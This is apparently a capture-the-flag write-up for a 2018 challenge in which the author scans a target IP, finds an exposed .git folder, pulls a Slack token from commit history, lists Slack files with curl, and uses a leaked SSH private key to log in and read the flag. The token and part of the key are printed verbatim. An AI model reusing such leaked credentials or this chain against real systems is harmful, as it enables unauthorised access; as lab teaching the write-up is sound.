## OSINT4 (OSINT, 400pt)

> This server is an staging/uat box but the developer has got a public IP on the same. 
> Someone exploited the misconfiguration and got hold of the box. 
>
> Can you re-hack the server and get hold of attacker's secret flag.
>
> Target: 54.85.105.103

We start with an nmap scan:

```bash
$ nmap -sS 54.85.105.103

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-10 00:38 EET
Nmap scan report for ec2-54-85-105-103.compute-1.amazonaws.com (54.85.105.103)
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http

Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds
```

We can easily locate that a `.git` folder is accessible with `dirb`. It has a remote pointing to `https://github.com/johnatcorp/corpnull`. We check the commits of this repository and we find a token for the Slack API.

![](Github.jpg)

After poking around with the various [Slack API methods](https://api.slack.com/methods) we locate some interesting files.

```bash
$ curl -sH 'Authorization: Bearer xoxp-302709175073-304111796230-302748987361-6d10dcd6f4cedc60900986def747f0e5' https://slack.com/api/files.list | jq '.files[] | {name: .name, url: .permalink_public, preview: .preview}'
{
  "name": "id_rsa.pub",
  "url": "https://slack-files.com/T8WLV5525-F8XC1KB37-32b7572f04",
  "preview": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC7RUm542gWJ56hYOpp4iAMSmF/WAQAO/dKKg4+QC7EfA1NxRtDsfsB0ehQ1z+V+3CK7AJPeMnfsALPTSLfu0O8vXAuT+ja+UnjwFMuTLySAb1EN9G1S5jls1xcGYdAo4RcDNUFjDAVzq7PoZ7h58IVmpJXUlyey2BVN2kwclohJRKxxnm3D7o++XRz9hwdBZq6088cEmOwxUsztRSg3a0STvQzo3YLv2Uc3OuhEUi8Z7Pslo4qA1I04gGfhcS5wv8Yp3TQvpiyxcHhfYmjHvommedaGltGNZTNi5YnTvFwX6d3yJYKrb8Cflx+M9Mk7CJvmX1bTpmslZEsH+Jhosj03BbqWSAI2SZUeYk2Wz+I/9WtCkaVHSuSRR4TyyEVBzLhaFAZbP/2lN3R3jyLfW0i8g20/6EExkjeNgYNolRTup/+RJ2dbleWIK+zBxPj0EJ8bY0RRBvzRsavpJBfcKSC6yqEBRXBhljf44M5OTos6KMXTlA3Pff46TDy2AWULn9PC7rMit9Nm6xx4ArX/b2ZDsCnOoeMWG0dehjePXsqu6rYqzi6utvpWDUbfISemfyoISVL1tLwNmhnHZcOgPmIOcx9xwbIvpaDjJAIopQcp4E3wmJ8TUvkaJzVWXVRw1cbp2kn7Si7dhgpWSrCAl9XmTUWLs+i+CagPxIfouTpVw== mikeatcorp@mail.com\n"
}
{
  "name": "id_rsa",
  "url": "https://slack-files.com/T8WLV5525-F8YA9C46T-3e2f445d5e",
  "preview": "-----BEGIN RSA PRIVATE KEY-----\nMIIJKAIBAAKCAgEAu0VJueNoFieeoWDqaeIgDEphf1gEADv3SioOPkAuxHwNTcUb\nQ7H7AdHoUNc/lftwiuwCT3jJ37ACz00i37tDvL1wLk/o2vlJ48BTLky8kgG9RDfR\ntUuY5bNcXBmHQKOEXAzVBYwwFc6uz6Ge4efCFZqSV1JcnstgVTdpMHJaISUSscZ5\ntw+6Pvl0c/YcHQWautPPHBJjsMVLM7UUoN2tEk70M6N2C79lHNzroRFIvGez7JaO"
}
```

Finally we download the private key, ssh to the server and locate the flag.

```bash
$ ssh -i id_rsa mikeatcorp@54.85.105.103
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-1047-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

24 packages can be updated.
0 updates are security updates.


*** System restart required ***
mikeatcorp@ip-172-30-1-179:~$ locate flag.txt
/secret/.supersecret/flag.txt
mikeatcorp@ip-172-30-1-179:~$ cat /secret/.supersecret/flag.txt
hackim18{'455676878965435365788698546'}
```